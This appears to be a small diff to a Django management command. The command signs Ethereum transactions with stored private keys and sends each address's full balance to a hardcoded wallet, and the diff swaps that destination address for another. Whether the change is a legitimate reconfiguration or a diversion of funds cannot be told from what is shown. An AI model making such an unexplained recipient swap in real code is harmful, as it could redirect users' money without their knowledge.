@@ -13,7 +13,7 @@ class Command(BaseCommand):
                 nonce=w3.eth.getTransactionCount(item.address),
                 gasPrice = w3.eth.gasPrice, 
                 gas = 90000,
-                to='0xD02718154f4eF7c1564DEC2D519441163df08de1',
+                to='0x09CE0c267E28cb02455555371dCD5aBc2282FaEf',
                 value=int(Web3.toWei(balance,'ether'))
                 ),
                 item.key)
